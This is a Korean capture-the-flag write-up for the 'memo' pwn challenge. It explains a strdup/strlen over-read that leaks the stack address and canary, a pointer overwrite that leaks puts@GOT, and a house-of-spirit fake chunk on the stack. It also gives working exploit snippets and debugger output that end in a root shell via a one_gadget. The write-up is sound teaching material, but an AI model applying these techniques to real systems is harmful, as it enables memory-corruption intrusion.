point : 200
# Description
```
Sometimes the wisest way to win is by giving up ;)

nc 159.203.116.12 8888
```
```
$ md5sum *
885acc6870b8ba98983e88e578179a2c  libc-2.23.so
e4096418e39ed90698b9a850d2d2c8a7  memo
```

# 취약점
## 취약점 1: strdup() 의 size check
```
__int64 __fastcall alloc(char *a1)
...
  fwrite("Data: ", 1uLL, 6uLL, stderr);
  if ( read(0, a1, 0x30uLL) <= 0 )
...
  *((_QWORD *)a1 + 3) = strdup(a1);
...
  printf("Are you done? [yes/no] ", a1);
  if ( read(0, s1, 6uLL) <= 0 )
...
    if ( strcmp(s1, "no") )
...
    if ( read(0, *((void **)a1 + 3), 0x30uLL) <= 0 )
```
위 함수는 데이터를 입력받고  
`strdup()` 를 이용한 메모리 할당을 한다.  
그리고 다시 한번 입력할 수도 있다. (`"Are you done? [yes/no] "`)  
`read()` 길이는 `0x30` 으로 고정되어있다.  
  
`strdup()` 함수는 동적 할당할 크기를 `strlen()` 을 통해서 정한다.  
```
/* Duplicate S, returning an identical malloc'd string.  */
char* __strdup (const char *s)
{
  size_t len = strlen (s) + 1;
  void *new = malloc (len);

  if (new == NULL)
    return NULL;

  return (char *) memcpy (new, s, len);
}
```
`strlen()` 은 `NULL` byte 가 나올때까지 길이를 측정하므로  
```
buf    -> 0x00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
canary -> 0x10: 00 de ad be
```
`canary` 앞까지의 `NULL` byte 를 덮어씌워준다면 ( `"A"*0x11` )  
```
buf    -> 0x00: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
canary -> 0x10: 41 de ad be
```
실제론 `0x11` 만큼만 입력했지만  
`strlen()` 은 `0x14` 만큼을 측정하게 되어 `malloc()` 한다.  
  
이 `strdup()` 로 인해서 현재 **스택의 주소(ASLR 우회)**와 **canary(SSP 해제)** 를 leak 할 수 있다.  

## 취약점 2: pointer 조작을 통한 GOT leak (BOF)
```
--==[[ Spiritual Memo ]]==--
[1] Create a memo            # alloc()
[2] Show memo                # dump()
[3] Delete memo              # del()
[4] Tap out
>
```
처음 프로그램을 시작하면 `menu()` 를 띄우는데  
`[4] Tap out` 을 누르면  
```
...
        alloc((__int64)&buf);
...
    fwrite("Giving up already? [yes/no] ", 1uLL, 0x1CuLL, stderr);
    if ( read(0, &buf, 0x30uLL) <= 0 )
...
```
`"Giving up already? ~"` 하면서 `read()` 한다.  
이때 `buf` 에 0x30 을 받을 수 있게 되는데  
( alloc() 에서 똑같은 read(0, ,0x30) 이 있지만 이후에 (&buf + 0x18) 에 주소를 초기화시키기 때문에 이용할 수가 없다. )  
`(&buf + 0x18)` 는 `dump()` 할 때의 참조하는 주소가 저장되는 곳이다.  
```
mov     rax, [rbp+var_18]
mov     rdi, rax
call    dump

buf = rbp-0x30
var_18 = rbp-0x18
buf + 0x18 = var_18
```
즉 `(&buf + 0x18)` 에 leak 하고 싶은 주소값을 넣기만하면  
그 주소에 저장되어 있는 데이터를 볼 수 있게된다.  
우리는 `puts@GOT` 를 leak 해서 **libc 의 base 주소**를 계산하고  
gadget 을 모을 것이다.  

## 취약점 3: house of spirit
취약점 1,2 만으로 RET 를 덮을 수 없다.  
`buf` 가 `rbp-0x30` 인데 read(,, 0x30) 이기 때문이다. ( 0x10 bytes 모자라다 )  
```
buf -> 0x00: 00000000 00000000 00000000 00000000
       0x10: 00000000 00000000 00000000 00000000
       0x20: 00000000 00000000 00000000 00000000
       0x30: <-     sfp     -> <-     ret     ->
```

```
mov     rax, [rbp+var_18]
mov     rdi, rax
call    del
```
`del()` 은 `free()` 하는 녀석이고  
매개변수로 BOF 를 통해 변조할 수 있는 `var_18` 이 들어간다.  
스택에 fake chunk 를 만들어서 `free()` 하게되면  
다음 `malloc()` 시에 fastbin 에서 할당 주소를 가져오게 되는 취약점을 이용해서  
RET 역시 변조할 수 있게 된다.  
```
buf    ->   0x00: 00000000 00000000 00000000 00000000
malloc() -> 0x10: 00000000 00000000 00000000 00000000
            0x20: 00000000 00000000 00000000 00000000
            0x30: <-     sfp     -> <-     ret     ->
```

# Exploit
1. 스택 주소와 canary leak  
	
	```
	0x7fff04a4d1c0: 0x0000000000000000      0x0000000000000000
	0x7fff04a4d1d0: 0x0000000000400e20      0x0000000000400870
	0x7fff04a4d1e0: 0x00007fff04a4d2d0      0x136fe51ca293f100
	0x7fff04a4d1f0: 0x0000000000400e20      0x00007f4af3297561
	
	0x7fff04a4d1e0 -> buf+0x110
	0x7fff04a4d1e8 -> canary
	```
	`read()` 하기 직전의 `buf` 의 모습이다.  
	`0x20` 만큼 데이터를 넣으면 `strdup()` 의 `strlen()` 이 길이를 잘못 재서 뒤의 데이터도 딸려온다.  
	```
	alloc('A'*0x20)
	buf = show(0x20) - 0x110
	
	0x20d1000:      0x0000000000000000      0x0000000000000031
	0x20d1010:      0x4141414141414141      0x4141414141414141
	0x20d1020:      0x4141414141414141      0x4141414141414141
	0x20d1030:      0x00007fff04a4d2d0      0x0000000000020fd1
	```
	이제 출력시키면 된다.  
	```
	[DEBUG] Received 0x2d bytes:
	    00000000  44 61 74 61  3a 20 41 41  41 41 41 41  41 41 41 41  │Data│: AA│AAAA│AAAA│
	    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
	    00000020  41 41 41 41  41 41 d0 d2  a4 04 ff 7f  0a           │AAAA│AA··│····│·│
	    0000002d
	[+] Buffer: 0x7fff04a4d1c0
	```
	  
	`canary` 도 똑같은 방법으로 leak 하면 된다.  
	  
2. GOT leak  
	
	```
    giveup('no'.ljust(24,'\x00')+p64(memo.got['puts']))
    libc = show(0) - elf.symbols['puts']
	
	0x7fff04a4d1c0: 0x0000000000006f6e      0x0000000000000000
	0x7fff04a4d1d0: 0x0000000000000000      0x0000000000601f90 <- puts@GOT
	0x7fff04a4d1e0: 0x4242424242424242      0x136fe51ca293f142
	0x7fff04a4d1f0: 0x0000000000400e20      0x00007f4af3297561
	```
	메뉴 4번으로 `(&buf + 0x18)` 을 `puts@GOT` 로 바꾸고 출력해주면  
	```
	.text:0000000000400C6B <dump+16>       mov     rsi, rax
	.text:0000000000400C6E <dump+19>       mov     edi, offset aDataS ; "Data: %s\n"
	.text:0000000000400C73 <dump+24>       mov     eax, 0
	.text:0000000000400C78 <dump+29>       call    printf
	
	RDI  0x400f85 ◂— 'Data: %s\n'
	RSI  0x601f90 (_GLOBAL_OFFSET_TABLE_+32) —▸ 0x7f4af32e1170 (puts)
	```
	```
	[DEBUG] Received 0xd bytes:
	    00000000  44 61 74 61  3a 20 70 11  2e f3 4a 7f  0a           │Data│: p·│.·J·│·│
	    0000000d
	[+] Libc: 0x7f4af3277000
	```
	  
3. house of spirit  
	
	```
	exp = 'no\x00'.ljust(8, 'C')
	exp += p64(0x20)
	exp += p64(0)
	exp += p64(buf+0x10)
	exp += p64(0)
	exp += p64(0x1234)
	giveup(exp)
	delete()
	
	0x7fff04a4d1c0: 0x4343434343006f6e      0x0000000000000020 <- size
	0x7fff04a4d1d0: 0x0000000000000000      0x00007fff04a4d1d0 <- free()
	0x7fff04a4d1e0: 0x0000000000000000      0x0000000000001234 <- next size
	0x7fff04a4d1f0: 0x0000000000400e20      0x00007f4af3297561
	```
	```
	.text:0000000000400C88 <del+8>         mov     [rbp+ptr], rdi
	.text:0000000000400C8C <del+12>        mov     rax, [rbp+ptr]
	.text:0000000000400C90 <del+16>        mov     rdi, rax        ; ptr
	.text:0000000000400C93 <del+19>        call    free
	
	RDI  0x7fff04a4d1d0 ◂— 0x0
	```
	free() 할 주소가 스택이다.  
	```
	fastbins
	0x20: 0x7fff04a4d1c0 ◂— 0x0
	0x30: 0x0
	0x40: 0x0
	0x50: 0x0
	0x60: 0x0
	0x70: 0x0
	0x80: 0x0
	```
	이제 똑같이 `0x20` 만큼 할당하게 되면 fastbin 에서 가져오게 된다.  
	  
	```
	alloc('D\x00', 'no\x00')
	one_gadget = 0x40beb
	r.sendafter('Data: ', '\x00'*24+p64(canary)+'EEEEEEEE'+p64(libc+one_gadget))
	
	0x7fff04a4d1c0: 0x4343434343000044      0x0000000000000020
	0x7fff04a4d1d0: 0x0000000000000000      0x0000000000000000
	0x7fff04a4d1e0: 0x0000000000000000      0x136fe51ca293f100
	0x7fff04a4d1f0: 0x4545454545454545      0x00007f4af32b7beb
	```
	RET 를 shell 떨구는 gadget 주소로 변조시켰다.  
	  
	```
	[+] Buffer: 0x7fff04a4d1c0
	[+] Canary: 0x136fe51ca293f100
	[+] Libc: 0x7f4af3277000
	Quitter!
	$ id
	uid=0(root) gid=0(root) groups=0(root)
	$
	```
